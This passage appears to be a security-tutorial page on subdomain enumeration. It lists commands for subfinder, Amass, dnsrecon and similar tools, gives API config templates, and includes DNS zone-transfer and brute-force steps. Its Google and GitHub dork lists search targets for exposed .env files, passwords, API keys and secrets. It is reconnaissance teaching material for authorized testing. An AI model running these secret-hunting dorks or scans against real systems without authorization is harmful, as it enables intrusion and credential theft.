---
title: Subdomain Enumeration
description: Complete subdomain enumeration guide with payloads, Kali Linux tools, public recon utilities, passive & active techniques, and privilege escalation through takeover.
navigation:
  icon: i-lucide-radar
  title: Subdomain Enumeration
---

## What is Subdomain Enumeration

Subdomain enumeration is the process of discovering all valid subdomains associated with a root domain. Every subdomain is a potential **attack surface** — forgotten staging servers, exposed admin panels, legacy APIs, internal tools accidentally facing the internet.

::note
Subdomains are the **#1 source** of critical findings in bug bounty programs. A single overlooked `dev.example.com` or `staging-api.example.com` can lead to full compromise.
::

::card-group
  ::card
  ---
  title: Passive Recon
  icon: i-lucide-eye-off
  ---
  Gather subdomains from **public data sources** without touching the target. Zero footprint. Certificate logs, search engines, threat intelligence feeds, archived crawl data.
  ::

  ::card
  ---
  title: Active Recon
  icon: i-lucide-scan-search
  ---
  Directly query target DNS servers through **brute forcing**, **zone transfers**, **permutation scanning**, and **virtual host discovery**. Generates traffic.
  ::

  ::card
  ---
  title: Subdomain Takeover
  icon: i-lucide-skull
  ---
  Identify **dangling DNS records** pointing to deprovisioned cloud services. Claim the service and serve content under the trusted domain for **privilege escalation**.
  ::

  ::card
  ---
  title: Kali Linux Arsenal
  icon: i-lucide-terminal
  ---
  Kali Linux ships with **dozens** of built-in reconnaissance tools ready for subdomain enumeration out of the box. No extra installation needed.
  ::
::

---

## News & Updates (2024–2025)

::tabs
  :::tabs-item{icon="i-lucide-newspaper" label="Latest News"}

  | Date | Update |
  | ---- | ------ |
  | **Jun 2025** | ProjectDiscovery releases **subfinder v2.7** with 60+ passive sources and improved recursive enumeration |
  | **May 2025** | **Amass v4.3** adds new graph database backend and improved ASN correlation |
  | **Apr 2025** | **Chaos by ProjectDiscovery** reaches 3B+ subdomain dataset available via free API |
  | **Mar 2025** | **Sublist3r** community fork adds VirusTotal API v3 support and Python 3.12 compatibility |
  | **Feb 2025** | Google announces **Certificate Transparency v2** with faster log indexing |
  | **Jan 2025** | **dnsx v1.3** adds AAAA, CNAME, MX batch resolution with JSON streaming output |
  | **Dec 2024** | **Nuclei v3.4** adds 40+ new subdomain takeover detection templates |
  | **Nov 2024** | **Subdominator** released as modern replacement for subjack with 100+ service fingerprints |
  | **Oct 2024** | **Assetnote** publishes 2024 wordlists from HTTP Archive with 10M+ subdomain patterns |
  | **Sep 2024** | **puredns v2.2** improves wildcard detection accuracy to 99.8% |

  :::

  :::tabs-item{icon="i-lucide-git-branch" label="Tool Releases"}

  | Tool | Version | What Changed |
  | ---- | ------- | ------------ |
  | subfinder | v2.7.x | New sources: Hunter, Quake, ZoomEye API v2 |
  | amass | v4.3.x | Graph DB backend, improved OSINT correlation |
  | puredns | v2.2.x | Better wildcard filtering, faster resolution |
  | nuclei | v3.4.x | 40+ takeover templates, workflow improvements |
  | dnsx | v1.3.x | Multi-record type batch resolution |
  | httpx | v1.6.x | Technology detection, screenshot capture |
  | sublist3r | v1.2.x | Community fork with Python 3.12 support |
  | knockpy | v7.x | Complete rewrite with API integration |
  | theHarvester | v4.6.x | New search engine modules |
  | fierce | v1.5.x | Updated for Python 3, Kali native |

  :::
::

---

## Passive Enumeration

Passive enumeration gathers subdomain data from **third-party public sources** without sending any packets to the target.

::tip
**Always start passive.** Exhaust every public data source before moving to active techniques. Passive recon is stealthy, fast, and often reveals 70–80% of a target's subdomains.
::

### Subfinder

Subfinder is the **industry standard** for passive subdomain enumeration. It queries 60+ data sources simultaneously and returns deduplicated results.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Basic Usage"}
  ```bash [Terminal]
  # Simple enumeration
  subfinder -d example.com -o subfinder.txt

  # All sources with verbose output
  subfinder -d example.com -all -v -o subfinder_all.txt

  # Silent mode for piping
  subfinder -d example.com -all -silent | tee subfinder_silent.txt

  # Multiple domains from file
  echo -e "example.com\nexample.org\nexample.net" > domains.txt
  subfinder -dL domains.txt -all -o multi_subs.txt

  # JSON output for parsing
  subfinder -d example.com -all -json -o subfinder.json

  # Recursive enumeration (find sub-subdomains)
  subfinder -d example.com -all -recursive -o recursive.txt

  # With rate limiting
  subfinder -d example.com -all -rate-limit 10 -o ratelimited.txt

  # Exclude specific sources
  subfinder -d example.com -all -es github,crtsh -o filtered.txt

  # Only specific sources
  subfinder -d example.com -sources crtsh,virustotal,securitytrails,shodan -o specific.txt

  # Show source for each result
  subfinder -d example.com -all -cs -o subfinder_sourced.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-settings" label="API Configuration"}
  ::code-collapse
  ```yaml [~/.config/subfinder/provider-config.yaml]
  # Subfinder Provider API Keys Configuration
  # Add as many keys as possible for maximum coverage
  # Free tier keys work for most sources

  binaryedge:
    - YOUR_BINARYEDGE_KEY

  bufferover:
    - YOUR_BUFFEROVER_KEY

  builtwith:
    - YOUR_BUILTWITH_KEY

  c99:
    - YOUR_C99_KEY

  censys:
    - YOUR_CENSYS_ID:YOUR_CENSYS_SECRET

  certspotter: []

  chaos:
    - YOUR_CHAOS_KEY

  chinaz: []

  dnsdb:
    - YOUR_DNSDB_KEY

  dnsrepo: []

  fofa:
    - YOUR_FOFA_EMAIL:YOUR_FOFA_KEY

  fullhunt:
    - YOUR_FULLHUNT_KEY

  github:
    - YOUR_GITHUB_TOKEN1
    - YOUR_GITHUB_TOKEN2
    - YOUR_GITHUB_TOKEN3

  hunter:
    - YOUR_HUNTER_KEY

  intelx:
    - YOUR_INTELX_HOST:YOUR_INTELX_KEY

  leakix:
    - YOUR_LEAKIX_KEY

  netlas:
    - YOUR_NETLAS_KEY

  passivetotal:
    - YOUR_PT_EMAIL:YOUR_PT_KEY

  quake:
    - YOUR_QUAKE_KEY

  robtex: []

  securitytrails:
    - YOUR_SECURITYTRAILS_KEY

  shodan:
    - YOUR_SHODAN_KEY

  threatbook:
    - YOUR_THREATBOOK_KEY

  urlscan:
    - YOUR_URLSCAN_KEY

  virustotal:
    - YOUR_VT_KEY

  whoisxmlapi:
    - YOUR_WHOISXML_KEY

  zoomeye:
    - YOUR_ZOOMEYE_KEY

  zoomeyeapi:
    - YOUR_ZOOMEYE_KEY
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-download" label="Installation"}
  ```bash [Terminal]
  # Go install (recommended)
  go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest

  # Kali Linux
  sudo apt install subfinder -y

  # Docker
  docker pull projectdiscovery/subfinder:latest
  docker run projectdiscovery/subfinder -d example.com

  # Binary release
  wget https://github.com/projectdiscovery/subfinder/releases/latest/download/subfinder_linux_amd64.zip
  unzip subfinder_linux_amd64.zip
  sudo mv subfinder /usr/local/bin/

  # Verify installation
  subfinder -version
  ```
  :::
::

### Sublist3r

Sublist3r is a **Python-based** subdomain enumeration tool that scrapes search engines (Google, Yahoo, Bing, Baidu, Ask) and integrates with Netcraft, VirusTotal, ThreatCrowd, DNSdumpster, and PassiveDNS.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Basic Usage"}
  ```bash [Terminal]
  # Basic enumeration
  python3 sublist3r.py -d example.com -o sublist3r.txt

  # With brute force module enabled
  python3 sublist3r.py -d example.com -b -o sublist3r_brute.txt

  # Specify number of threads
  python3 sublist3r.py -d example.com -t 50 -o sublist3r.txt

  # Use specific search engines only
  python3 sublist3r.py -d example.com -e google,yahoo,virustotal -o sublist3r.txt

  # Verbose output
  python3 sublist3r.py -d example.com -v -o sublist3r_verbose.txt

  # Specify ports to scan on discovered subdomains
  python3 sublist3r.py -d example.com -p 80,443,8080,8443 -o sublist3r_ports.txt

  # Silent mode
  python3 sublist3r.py -d example.com -o sublist3r.txt 2>/dev/null
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="As Python Module"}
  ```python [enumerate.py]
  #!/usr/bin/env python3
  import sublist3r

  # Basic usage
  subdomains = sublist3r.main(
      domain="example.com",
      threads=40,
      savefile="sublist3r_results.txt",
      ports=None,
      silent=False,
      verbose=True,
      enable_bruteforce=False,
      engines=None  # Use all engines
  )

  print(f"[+] Found {len(subdomains)} subdomains")
  for sub in subdomains:
      print(f"  - {sub}")
  ```
  :::

  :::tabs-item{icon="i-lucide-download" label="Installation"}
  ```bash [Terminal]
  # Kali Linux (pre-installed)
  sublist3r -d example.com

  # pip install
  pip3 install sublist3r

  # From GitHub (latest)
  git clone https://github.com/aboul3la/Sublist3r.git
  cd Sublist3r
  pip3 install -r requirements.txt
  python3 sublist3r.py -d example.com

  # Community fork (recommended - better maintained)
  git clone https://github.com/RoninNakomern/Sublist3r.git
  cd Sublist3r
  pip3 install -r requirements.txt
  ```
  :::
::

::warning
Sublist3r's original repository is **no longer actively maintained**. Consider using the community fork or combining it with subfinder for better coverage. Some search engine scrapers may break due to anti-bot changes.
::

### Amass (OWASP)

Amass is OWASP's **attack surface mapping** tool. It performs the deepest passive enumeration with ASN discovery, network mapping, and data correlation.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Basic Usage"}
  ```bash [Terminal]
  # Passive enumeration only
  amass enum -passive -d example.com -o amass_passive.txt

  # Active enumeration (includes DNS resolution + brute force)
  amass enum -active -d example.com -o amass_active.txt

  # With brute force
  amass enum -brute -d example.com -o amass_brute.txt

  # Specify config file with API keys
  amass enum -passive -d example.com -config ~/.config/amass/config.ini -o amass.txt

  # JSON output
  amass enum -passive -d example.com -json amass.json

  # ASN discovery
  amass intel -asn 12345 -o asn_domains.txt

  # Find ASN for a domain
  amass intel -d example.com -whois -o intel.txt

  # Reverse whois for related domains
  amass intel -d example.com -whois -o related_domains.txt

  # Visualize results
  amass viz -d example.com -o amass_viz.html

  # Track changes over time
  amass track -d example.com -last 2

  # Database query
  amass db -names -d example.com
  ```
  :::

  :::tabs-item{icon="i-lucide-settings" label="Configuration"}
  ::code-collapse
  ```ini [~/.config/amass/config.ini]
  [scope]
  port = 80
  port = 443
  port = 8080
  port = 8443

  [data_sources]
  minimum_ttl = 1440

  [data_sources.AlienVault]
  [data_sources.AlienVault.Credentials]
  apikey = YOUR_OTX_KEY

  [data_sources.BinaryEdge]
  [data_sources.BinaryEdge.Credentials]
  apikey = YOUR_BINARYEDGE_KEY

  [data_sources.Censys]
  [data_sources.Censys.Credentials]
  apikey = YOUR_CENSYS_ID
  secret = YOUR_CENSYS_SECRET

  [data_sources.Chaos]
  [data_sources.Chaos.Credentials]
  apikey = YOUR_CHAOS_KEY

  [data_sources.DNSDB]
  [data_sources.DNSDB.Credentials]
  apikey = YOUR_DNSDB_KEY

  [data_sources.GitHub]
  [data_sources.GitHub.accountname]
  apikey = YOUR_GITHUB_TOKEN

  [data_sources.Hunter]
  [data_sources.Hunter.Credentials]
  apikey = YOUR_HUNTER_KEY

  [data_sources.IntelX]
  [data_sources.IntelX.Credentials]
  apikey = YOUR_INTELX_KEY

  [data_sources.PassiveTotal]
  [data_sources.PassiveTotal.Credentials]
  apikey = YOUR_PT_KEY
  secret = YOUR_PT_SECRET

  [data_sources.SecurityTrails]
  [data_sources.SecurityTrails.Credentials]
  apikey = YOUR_SECURITYTRAILS_KEY

  [data_sources.Shodan]
  [data_sources.Shodan.Credentials]
  apikey = YOUR_SHODAN_KEY

  [data_sources.URLScan]
  [data_sources.URLScan.Credentials]
  apikey = YOUR_URLSCAN_KEY

  [data_sources.VirusTotal]
  [data_sources.VirusTotal.Credentials]
  apikey = YOUR_VT_KEY

  [data_sources.WhoisXMLAPI]
  [data_sources.WhoisXMLAPI.Credentials]
  apikey = YOUR_WHOISXML_KEY

  [data_sources.ZoomEye]
  [data_sources.ZoomEye.Credentials]
  apikey = YOUR_ZOOMEYE_KEY
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-download" label="Installation"}
  ```bash [Terminal]
  # Kali Linux
  sudo apt install amass -y

  # Go install
  go install -v github.com/owasp-amass/amass/v4/...@master

  # Docker
  docker pull caffix/amass:latest
  docker run -v ~/.config/amass:/root/.config/amass caffix/amass enum -passive -d example.com

  # Snap
  sudo snap install amass

  # Verify
  amass -version
  ```
  :::
::

### Kali Linux Built-in Tools

Kali Linux ships with multiple subdomain enumeration tools **pre-installed** and ready to use.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="theHarvester"}
  ```bash [Terminal]
  # theHarvester - Gathers emails, subdomains, hosts, employee names
  # Pre-installed on Kali Linux

  # Basic subdomain enumeration
  theHarvester -d example.com -b all -f harvester_results

  # Specific sources
  theHarvester -d example.com -b google,bing,yahoo,duckduckgo,virustotal -f harvester.html

  # DNS brute force
  theHarvester -d example.com -b all -c -f harvester_dns

  # With Shodan
  theHarvester -d example.com -b shodan -f harvester_shodan

  # Limit results
  theHarvester -d example.com -b google -l 500 -f harvester_google

  # Available sources
  theHarvester -d example.com -b \
    anubis,baidu,bevigil,binaryedge,bing,bingapi,bufferoverun,brave,censys,certspotter,\
    crtsh,dnsdumpster,duckduckgo,fullhunt,github-code,hackertarget,hunter,hunterhow,\
    intelx,netlas,onyphe,otx,pentesttools,projectdiscovery,rapiddns,rocketreach,\
    securityTrails,shodan,sitedossier,subdomaincenter,subdomainfinderc99,threatminer,\
    tomba,urlscan,virustotal,yahoo,zoomeye
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="fierce"}
  ```bash [Terminal]
  # fierce - DNS reconnaissance tool
  # Pre-installed on Kali Linux

  # Basic enumeration
  fierce --domain example.com

  # With custom DNS server
  fierce --domain example.com --dns-servers 8.8.8.8,1.1.1.1

  # With subdomain wordlist
  fierce --domain example.com --subdomain-file /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

  # Traverse adjacent IPs
  fierce --domain example.com --traverse 10

  # Wide scan
  fierce --domain example.com --wide

  # With delay between queries
  fierce --domain example.com --delay 1

  # Connect to discovered hosts
  fierce --domain example.com --connect
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="dnsrecon"}
  ```bash [Terminal]
  # dnsrecon - DNS enumeration and scanning
  # Pre-installed on Kali Linux

  # Standard enumeration
  dnsrecon -d example.com

  # Zone transfer attempt
  dnsrecon -d example.com -t axfr

  # Brute force
  dnsrecon -d example.com -t brt \
    -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

  # Standard + brute force + zone transfer
  dnsrecon -d example.com -t std,brt,axfr

  # Google dorking for subdomains
  dnsrecon -d example.com -t goo

  # Reverse lookup on IP range
  dnsrecon -r 192.168.1.0/24

  # Cache snooping
  dnsrecon -d example.com -t snoop -n 8.8.8.8

  # DNSSEC zone walk
  dnsrecon -d example.com -t zonewalk

  # CSV output
  dnsrecon -d example.com -t std,brt --csv dnsrecon_output.csv

  # JSON output
  dnsrecon -d example.com -j dnsrecon_output.json

  # XML output
  dnsrecon -d example.com --xml dnsrecon_output.xml
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="dnsenum"}
  ```bash [Terminal]
  # dnsenum - Multithreaded DNS enumeration
  # Pre-installed on Kali Linux

  # Basic enumeration
  dnsenum example.com

  # With brute force
  dnsenum --enum example.com

  # Custom wordlist
  dnsenum -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt example.com

  # With threading
  dnsenum --threads 50 example.com

  # Recursion depth
  dnsenum -r example.com

  # Whois queries
  dnsenum -w example.com

  # Output to file
  dnsenum -o dnsenum_results.xml example.com

  # Google scraping pages
  dnsenum -p 10 example.com

  # Full enumeration with all options
  dnsenum --enum -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
    --threads 50 -r -w -o dnsenum_full.xml example.com
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="dig & host & nslookup"}
  ```bash [Terminal]
  # dig - DNS lookup utility (pre-installed everywhere)

  # Basic lookups
  dig example.com A +short
  dig example.com AAAA +short
  dig example.com MX +short
  dig example.com NS +short
  dig example.com TXT +short
  dig example.com SOA +short
  dig example.com CNAME +short
  dig example.com ANY +noall +answer

  # Zone transfer attempt
  dig axfr example.com @ns1.example.com

  # Reverse DNS
  dig -x 93.184.216.34 +short

  # Trace DNS resolution path
  dig example.com +trace

  # Specific DNS server
  dig @8.8.8.8 example.com A +short

  # DNSSEC verification
  dig example.com +dnssec

  # ---

  # host - Simple DNS lookup
  host example.com
  host -t axfr example.com ns1.example.com
  host -t mx example.com
  host -t ns example.com
  host -t txt example.com
  host -a example.com

  # ---

  # nslookup
  nslookup example.com
  nslookup -type=any example.com
  nslookup -type=axfr example.com ns1.example.com
  nslookup -type=srv _sip._tcp.example.com
  nslookup -type=srv _ldap._tcp.example.com
  nslookup -type=srv _kerberos._tcp.example.com
  ```
  :::
::

### Knockpy

Knock is a Python tool that enumerates subdomains using **wordlist brute force** combined with **VirusTotal** and **DNS resolution**.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Usage"}
  ```bash [Terminal]
  # Basic scan
  knockpy example.com

  # With custom wordlist
  knockpy example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

  # Show only resolved subdomains
  knockpy example.com --no-http

  # JSON output
  knockpy example.com -o json

  # CSV output
  knockpy example.com -o csv

  # With VirusTotal API
  export VT_API_KEY="YOUR_VT_KEY"
  knockpy example.com

  # Recon mode (passive + active)
  knockpy example.com --recon

  # DNS only (no HTTP probing)
  knockpy example.com --dns
  ```
  :::

  :::tabs-item{icon="i-lucide-download" label="Installation"}
  ```bash [Terminal]
  # pip install
  pip3 install knockpy

  # From GitHub
  git clone https://github.com/guelfoweb/knock.git
  cd knock
  pip3 install -r requirements.txt
  python3 setup.py install

  # Kali Linux
  sudo apt install knockpy -y
  ```
  :::
::

### Assetfinder

Fast, Go-based tool that finds subdomains from **multiple passive sources** with minimal configuration.

```bash [Terminal]
# Basic usage
assetfinder example.com | tee assetfinder.txt

# Subdomains only (no related domains)
assetfinder --subs-only example.com | tee assetfinder_subs.txt

# Pipe to other tools
assetfinder --subs-only example.com | httprobe | tee alive.txt

# Installation
go install -v github.com/tomnomnom/assetfinder@latest
```

### Findomain

Cross-platform subdomain finder with **monitoring** and **alerting** capabilities.

```bash [Terminal]
# Basic enumeration
findomain -t example.com -o

# With all sources
findomain -t example.com --all-apis -o

# JSON output
findomain -t example.com -u findomain.txt --json findomain.json

# Multiple targets
findomain -f domains.txt -o

# Monitor mode (sends alerts on new subdomains)
findomain -t example.com --monitoring-flag \
  -e "your@email.com" \
  --telegram-bot-token "BOT_TOKEN" \
  --telegram-chat-id "CHAT_ID"

# With specific resolvers
findomain -t example.com -r resolvers.txt -o

# Installation
# Download from GitHub releases
wget https://github.com/Findomain/Findomain/releases/latest/download/findomain-linux.zip
unzip findomain-linux.zip
chmod +x findomain
sudo mv findomain /usr/local/bin/
```

### Certificate Transparency Logs

CT logs are **public records** of every SSL/TLS certificate ever issued. They are one of the **richest free sources** for subdomain data.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="crt.sh"}
  ```bash [Terminal]
  # Basic crt.sh query
  curl -s "https://crt.sh/?q=%25.example.com&output=json" | \
    jq -r '.[].name_value' | \
    sort -u | \
    grep -v "^\*" > crtsh_subs.txt

  echo "[+] Found $(wc -l < crtsh_subs.txt) subdomains from CT logs"

  # With wildcard removal and deduplication
  curl -s "https://crt.sh/?q=%25.example.com&output=json" | \
    jq -r '.[].name_value' | \
    sed 's/\*\.//g' | \
    tr '\n' '\n' | \
    sort -u > crtsh_clean.txt

  # Search for specific patterns
  curl -s "https://crt.sh/?q=%25admin%25.example.com&output=json" | \
    jq -r '.[].name_value' | sort -u

  curl -s "https://crt.sh/?q=%25api%25.example.com&output=json" | \
    jq -r '.[].name_value' | sort -u

  curl -s "https://crt.sh/?q=%25dev%25.example.com&output=json" | \
    jq -r '.[].name_value' | sort -u

  # crt.sh via psql (direct database - most complete)
  psql -h crt.sh -p 5432 -U guest certwatch -c \
    "SELECT DISTINCT ci.NAME_VALUE FROM certificate_identity ci \
     WHERE ci.NAME_VALUE LIKE '%.example.com' \
     ORDER BY ci.NAME_VALUE;" > crtsh_psql.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Censys"}
  ```bash [Terminal]
  # Censys certificate search
  export CENSYS_API_ID="YOUR_ID"
  export CENSYS_API_SECRET="YOUR_SECRET"

  # Using censys CLI
  pip3 install censys
  censys search "parsed.names: example.com" --index-type certificates | \
    jq -r '.[] | .parsed.names[]' | \
    sort -u > censys_subs.txt

  # Using API directly
  curl -s "https://search.censys.io/api/v2/certificates/search" \
    -u "$CENSYS_API_ID:$CENSYS_API_SECRET" \
    -H "Content-Type: application/json" \
    -d '{"q": "parsed.names: example.com", "per_page": 100}' | \
    jq -r '.result.hits[].parsed.names[]' | \
    sort -u > censys_api_subs.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="certspotter"}
  ```bash [Terminal]
  # CertSpotter API (free tier available)
  curl -s "https://api.certspotter.com/v1/issuances?domain=example.com&include_subdomains=true&expand=dns_names" | \
    jq -r '.[].dns_names[]' | \
    sort -u > certspotter_subs.txt
  ```
  :::
::

### Search Engine Dorking

::tabs
  :::tabs-item{icon="i-lucide-search" label="Google Dorks"}
  ```txt [Payloads]
  site:example.com -www
  site:*.example.com
  site:example.com -www -shop -blog
  site:example.com inurl:admin
  site:example.com inurl:dev
  site:example.com inurl:staging
  site:example.com inurl:test
  site:example.com inurl:api
  site:example.com inurl:portal
  site:example.com inurl:vpn
  site:example.com inurl:mail
  site:example.com inurl:remote
  site:example.com inurl:internal
  site:example.com inurl:jenkins
  site:example.com inurl:jira
  site:example.com inurl:grafana
  site:example.com inurl:kibana
  site:example.com intitle:"index of"
  site:example.com intitle:"dashboard"
  site:example.com ext:php
  site:example.com ext:asp
  site:example.com ext:jsp
  site:example.com filetype:env
  site:example.com filetype:log
  site:example.com filetype:conf
  site:example.com filetype:bak
  site:example.com filetype:sql
  site:example.com filetype:xml
  site:example.com filetype:json
  ```
  :::

  :::tabs-item{icon="i-lucide-search" label="Bing Dorks"}
  ```txt [Payloads]
  site:example.com
  domain:example.com
  ip:TARGET_IP
  site:example.com -site:www.example.com
  site:example.com instreamset:(url title):admin
  site:example.com instreamset:(url):api
  site:example.com instreamset:(url):staging
  site:example.com feed:example.com
  ```
  :::

  :::tabs-item{icon="i-lucide-search" label="Yandex & Baidu"}
  ```txt [Payloads]
  # Yandex (indexes unique content not found on Google)
  host:example.com
  site:example.com rhost:example.com
  site:example.com lang:en

  # Baidu (indexes Chinese and Asian infrastructure)
  site:example.com
  domain:example.com
  ```
  :::

  :::tabs-item{icon="i-lucide-search" label="Shodan & Fofa"}
  ```txt [Payloads]
  # Shodan
  hostname:example.com
  ssl.cert.subject.cn:example.com
  ssl:"example.com"
  org:"Example Inc"
  asn:AS12345
  http.title:"example"
  http.favicon.hash:HASH_VALUE

  # FOFA
  domain="example.com"
  host="example.com"
  cert="example.com"
  title="example"
  header="example.com"
  ```
  :::
::

### Third-Party API Sources

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="SecurityTrails"}
  ```bash [Terminal]
  export API_KEY="YOUR_SECURITYTRAILS_KEY"

  # Get subdomains
  curl -s "https://api.securitytrails.com/v1/domain/example.com/subdomains" \
    -H "APIKEY: $API_KEY" | \
    jq -r '.subdomains[]' | \
    sed "s/$/.example.com/" | \
    sort -u > securitytrails.txt

  # Get DNS history
  curl -s "https://api.securitytrails.com/v1/history/example.com/dns/a" \
    -H "APIKEY: $API_KEY" | \
    jq -r '.records[].values[].ip' > st_dns_history.txt

  # Get associated domains
  curl -s "https://api.securitytrails.com/v1/domain/example.com/associated" \
    -H "APIKEY: $API_KEY" | jq .
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="VirusTotal"}
  ```bash [Terminal]
  export VT_API="YOUR_VT_KEY"

  # Get subdomains
  curl -s "https://www.virustotal.com/api/v3/domains/example.com/subdomains?limit=40" \
    -H "x-apikey: $VT_API" | \
    jq -r '.data[].id' | \
    sort -u > virustotal.txt

  # Paginate for more results
  CURSOR=""
  while true; do
    RESPONSE=$(curl -s "https://www.virustotal.com/api/v3/domains/example.com/subdomains?limit=40&cursor=$CURSOR" \
      -H "x-apikey: $VT_API")
    echo "$RESPONSE" | jq -r '.data[].id' >> virustotal_all.txt
    CURSOR=$(echo "$RESPONSE" | jq -r '.meta.cursor // empty')
    [ -z "$CURSOR" ] && break
    sleep 15  # Rate limit: 4 requests/minute on free tier
  done
  sort -u -o virustotal_all.txt virustotal_all.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="AlienVault OTX"}
  ```bash [Terminal]
  # No API key required for basic queries
  curl -s "https://otx.alienvault.com/api/v1/indicators/domain/example.com/passive_dns" | \
    jq -r '.passive_dns[].hostname' | \
    sort -u | grep "example.com" > otx.txt

  # URL list
  curl -s "https://otx.alienvault.com/api/v1/indicators/domain/example.com/url_list" | \
    jq -r '.url_list[].url' | \
    sed 's|https\?://||' | cut -d'/' -f1 | \
    sort -u >> otx.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Shodan CLI"}
  ```bash [Terminal]
  # Install Shodan CLI
  pip3 install shodan
  shodan init YOUR_SHODAN_KEY

  # Domain enumeration
  shodan domain example.com | tee shodan_domain.txt

  # Parse subdomains
  shodan domain example.com | awk '{print $1}' | sort -u > shodan_subs.txt

  # Search by SSL certificate
  shodan search ssl.cert.subject.cn:example.com --fields ip_str,hostnames | \
    tr ',' '\n' | grep "example.com" | sort -u >> shodan_subs.txt

  # Search by organization
  shodan search org:"Example Inc" --fields ip_str,hostnames
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="RapidDNS & Others"}
  ```bash [Terminal]
  # RapidDNS (no API key)
  curl -s "https://rapiddns.io/subdomain/example.com?full=1#result" | \
    grep -oP '_blank">\K[^<]*' | \
    grep -v http | sort -u > rapiddns.txt

  # HackerTarget
  curl -s "https://api.hackertarget.com/hostsearch/?q=example.com" | \
    cut -d',' -f1 | sort -u > hackertarget.txt

  # ThreatMiner
  curl -s "https://api.threatminer.org/v2/domain.php?q=example.com&rt=5" | \
    jq -r '.results[]' | sort -u > threatminer.txt

  # Anubis
  curl -s "https://jldc.me/anubis/subdomains/example.com" | \
    jq -r '.[]' | sort -u > anubis.txt

  # Riddler
  curl -s "https://riddler.io/search/exportcsv?q=pld:example.com" | \
    grep -oP '[a-zA-Z0-9.-]+\.example\.com' | sort -u > riddler.txt

  # DNSdumpster (scrape)
  # Use the website: https://dnsdumpster.com/

  # Netcraft
  # Use the website: https://searchdns.netcraft.com/?host=example.com

  # BufferOver
  curl -s "https://dns.bufferover.run/dns?q=.example.com" | \
    jq -r '.FDNS_A[]' | cut -d',' -f2 | sort -u > bufferover.txt

  # Omnisint / Sonar
  curl -s "https://sonar.omnisint.io/subdomains/example.com" | \
    jq -r '.[]' | sort -u > omnisint.txt

  # URLScan.io
  curl -s "https://urlscan.io/api/v1/search/?q=domain:example.com&size=100" | \
    jq -r '.results[].page.domain' | sort -u > urlscan.txt
  ```
  :::
::

### Wayback Machine & Web Archives

```bash [Terminal]
# Wayback Machine CDX API
curl -s "http://web.archive.org/cdx/search/cdx?url=*.example.com/*&output=text&fl=original&collapse=urlkey" | \
  sed 's|https\?://||' | cut -d'/' -f1 | sort -u > wayback.txt

# Using waybackurls
echo "example.com" | waybackurls | unfurl --unique domains | \
  grep "example.com" | sort -u > waybackurls.txt

# Using gau (Get All URLs)
echo "example.com" | gau --subs | unfurl --unique domains | \
  grep "example.com" | sort -u > gau_subs.txt

# Common Crawl
curl -s "https://index.commoncrawl.org/CC-MAIN-2024-10-index?url=*.example.com&output=json" | \
  jq -r '.url' | sed 's|https\?://||' | cut -d'/' -f1 | sort -u > commoncrawl.txt

# Combine all archive sources
cat wayback.txt waybackurls.txt gau_subs.txt commoncrawl.txt | sort -u > archive_subs.txt
echo "[+] Archive sources: $(wc -l < archive_subs.txt) unique subdomains"
```

### GitHub & Source Code Leaks

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="GitHub Dorking"}
  ```txt [Payloads - Search on github.com]
  "example.com" subdomain
  "example.com" api_key
  "example.com" endpoint
  "example.com" password
  "example.com" secret
  "example.com" token
  "example.com" config
  "example.com" database
  "example.com" internal
  "*.example.com"
  "staging.example.com"
  "dev.example.com"
  "api.example.com"
  org:targetorg "example.com"
  org:targetorg subdomain
  org:targetorg hostname
  filename:.env "example.com"
  filename:config "example.com"
  filename:docker-compose "example.com"
  filename:.htaccess "example.com"
  filename:nginx.conf "example.com"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Tools"}
  ```bash [Terminal]
  # github-subdomains
  github-subdomains -d example.com -t YOUR_GITHUB_TOKEN -o github_subs.txt

  # github-endpoints
  github-endpoints -d example.com -t YOUR_GITHUB_TOKEN -o github_endpoints.txt

  # trufflehog (secrets in repos)
  trufflehog github --org=targetorg --only-verified

  # gitdorker
  python3 GitDorker.py -t YOUR_GITHUB_TOKEN -d example.com -o gitdorker_results.txt

  # Installation
  go install -v github.com/gwen001/github-subdomains@latest
  ```
  :::
::

---

## Active Enumeration

Active techniques **directly query** the target's DNS servers. They generate traffic and may be logged.

::warning
Active enumeration generates traffic to the target infrastructure. Ensure you have **explicit written authorization** before proceeding. Brute forcing DNS at high rates can trigger security alerts or cause service disruption.
::

### DNS Brute Forcing

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="puredns"}
  ```bash [Terminal]
  # puredns - Most accurate DNS brute forcer with wildcard detection

  # Basic brute force
  puredns bruteforce wordlist.txt example.com \
    --resolvers resolvers.txt \
    -w puredns.txt

  # With rate limiting
  puredns bruteforce wordlist.txt example.com \
    --resolvers resolvers.txt \
    --rate-limit 500 \
    -w puredns.txt

  # Resolve a pre-collected list
  puredns resolve all_subdomains.txt \
    --resolvers resolvers.txt \
    -w resolved.txt

  # With wildcard batch size
  puredns bruteforce wordlist.txt example.com \
    --resolvers resolvers.txt \
